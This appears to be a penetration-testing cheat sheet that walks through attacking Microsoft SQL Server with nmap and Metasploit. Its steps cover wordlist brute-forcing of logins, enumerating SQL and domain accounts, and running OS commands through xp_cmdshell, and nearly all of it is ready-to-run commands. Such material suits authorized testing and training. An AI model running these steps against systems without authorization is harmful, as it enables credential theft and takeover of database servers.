
### 🛠️ MSSQL Enumeration & Exploitation via Metasploit

After identifying MSSQL service running on the target (commonly on port **1433**), perform the following steps:

---

### 🔍 Step 1: Scan for MSSQL Service

```bash
nmap <ip>
nmap <ip> -p 1433 -sV --script ms-sql-info
```

* Checks if MSSQL service is running and retrieves version information.

---

### 📥 Step 2: Launch Metasploit Framework

```bash
msfconsole
```

---

### 🧪 Step 3: MSSQL Login Bruteforce

```bash
use auxiliary/scanner/mssql/mssql_login
setg RHOSTS <ip>                   # Target IP
set USER_FILE <path/to/usernames.txt>   # Example: /usr/share/wordlists/usernames.txt
set PASS_FILE <path/to/passwords.txt>   # Example: /usr/share/wordlists/passwords.txt
set VERBOSE false
run
```

* Attempts to brute-force MSSQL credentials.

---

### 🧾 Step 4: Enumerate MSSQL Server

```bash
use auxiliary/scanner/mssql/mssql_enum
set RHOSTS <ip>
run
```

* Enumerates general MSSQL server information (hostname, version, etc.).

---

### 👥 Step 5: Enumerate SQL Logins

```bash
use auxiliary/scanner/mssql/mssql_enum_sql_logins
set RHOSTS <ip>
run
```

* Lists all SQL server logins if credentials are found or login is successful.

---

### ⚙️ Step 6: Execute SQL Commands

```bash
use auxiliary/admin/mssql/mssql_exec
set RHOSTS <ip>
set USERNAME <valid_username>
set PASSWORD <valid_password>
set CMD "whoami"     # Example command
run
```

* Executes system commands on the target MSSQL server (via `xp_cmdshell`).

---

### 🏛️ Step 7: Enumerate Domain Accounts

```bash
use auxiliary/scanner/mssql/mssql_enum_domain_accounts
set RHOSTS <ip>
run
```

* Attempts to enumerate domain accounts from the SQL server.

---

### ✅ Summary of Required Paths

| **Wordlist Type** | **Example Path**                     |
| ----------------- | ------------------------------------ |
| Username file     | `/usr/share/wordlists/usernames.txt` |
| Password file     | `/usr/share/wordlists/rockyou.txt`   |

---

### 🧠 Notes

* Ensure `xp_cmdshell` is enabled if you want to execute OS-level commands. Some commands may fail if it's disabled.
* Use `setg` only when you want to make variables global across modules.
* Some MSSQL services may require **Windows Authentication** instead of SQL authentication — Metasploit modules might not work in those cases.
* Always run `options` to verify required settings before `run`.
